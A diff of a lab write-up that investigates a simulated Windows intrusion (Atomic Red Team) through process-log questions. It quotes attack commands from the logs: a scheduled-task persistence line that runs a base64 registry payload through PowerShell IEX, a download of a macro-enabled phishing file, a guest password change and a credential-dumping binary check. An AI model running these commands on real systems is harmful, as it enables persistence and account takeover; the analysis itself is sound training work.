@@ -31,21 +31,61 @@ Note: The questions for this task are not answered in order as the solutions wer
 
 #### Question 7: Data was exfiltrated from the host. What was the flag that was part of the data?
 
-After adding the columns into the table, we noticed that there is a flag hidden among the commandLine columns. (If you didn't scroll to fast!)
+After adding the columns into the table, we noticed that there is a flag hidden among the commandLine columns. (If you didn't scroll too fast!)
 
-![Q7](q7.png)
+![Q7](q7.png){: height="200"}
 
 From this log we know that the threat actor achieved his goal at 14:56 PM.
 
-#### Question 1: Initial access was established using a downloaded file. What is the file name saved on the host?
+#### Question 5: What password was set for the new user account?
+
+![Q5](q5.png)
+
+The command **C:\Windows\system32\net1 user guest I_AM_M0NIT0R1NG** indicates that the password for the guest user account was changed to I_AM_M0NIT0R1NG. This is based on the syntax of the net user command, which follows the format **`net user <username> <new_password>`**.
 
 #### Question 2: What is the full command run to create a scheduled task?
 
+At time 14:12:43, we noticed a very interesting command line, inclduding the parent command line.
+
+As you have noticed, the approach is done by slowly working backwards and discovering the anomalies as we go along. 
+
+![Q2](q2.png)
+
+We noticed the **schtask.exe** command here which is responsible for scheduling tasks.
+
+The full command is the parent command line here in the snapshot.
+Solution: \"cmd.exe\" /c \"reg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyB3d3cueW91YXJldnVsbmVyYWJsZS50aG0= /f &amp; schtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\" /sc daily /st 12:34\"
+
 #### Question 3: What time is the scheduled task meant to run?
 
-#### Question 4: What was encoded?
+The scheduled time is found in the parent command line from question 2, which is **12:34** PM.
 
-#### Question 5: What password was set for the new user account?
+#### Question 1: Initial access was established using a downloaded file. What is the file name saved on the host?
+
+At time 13:50:12, we noticed a rather suspicious command line.
+
+The command **`$url ='http://localhost/SwiftSpend_Financial_Expenses.xlsm'`** sets a variable $url with the address of the file to download. The file is hosted on localhost, meaning the threat actor might have set up a local web server. The file type .xlsm is an Excel macro-enabled spreadsheet, often used in phishing.
+
+The part **`Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm`** downloads the file from $url and saves it as PhishingAttachment.xlsm in the system's temp directory. However, the task only accept the answer ***`SwiftSpend_Financial_Expenses.xlsm'`** which is the host file instead o the saved file, when the saved file is requested.
 
 #### Question 6: What is the name of the .exe that was used to dump credentials?
 
+I thought this was a easy question and assumed the answer was mimikatz.exe, as this malware is a popular an exploit on Microsoft Windows that extracts passwords stored in memory and software that performs that exploit.
+
+![Q6](q6.png)
+
+After going through a long long time of scrolling and testing other executables found in the logs, I stumbled upon the command **`\"powershell.exe\" &amp; {$mimikatz_path = cmd /c echo C:\\Tools\\AtomicRedTeam\\atomics\\T1003.001\\bin\\x64\\memotech.exe if (Test-Path $mimikatz_path) {exit 0} else {exit 1}}`** 
+
+The command uses PowerShell to verify whether the memotech.exe binary—commonly used in Atomic Red Team simulations of credential dumping (T1003.001)—is present at the specified path. It exits with code 0 if the file exists, or 1 otherwise, making it suitable for scripting and automated test validation.
+
+#### Question 4: What was encoded?
+
+It took quite some time until I finally decided to look for online solution. I was indeed frustrated when the solution was just right infront of my eyes. 
+
+From the parent command line in Question 2, there is a string which appears to be an encoding of base 64. 
+
+```console
+reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyB3d3cueW91YXJldnVsbmVyYWJsZS50aG0= /f
+```
+
+This commands adds a string (**REG_SZ**) to the registry at **HKCU\SOFTWARE\ATOMIC-T1053.005**. The value name is **test** with the data **`cGluZyB3d3cueW91YXJldnVsbmVyYWJsZS50aG0`**. Using Cyberchef, the base64 decodes to **`ping www.youarevulnerable.thm`** , which is the solution to Question 4. 
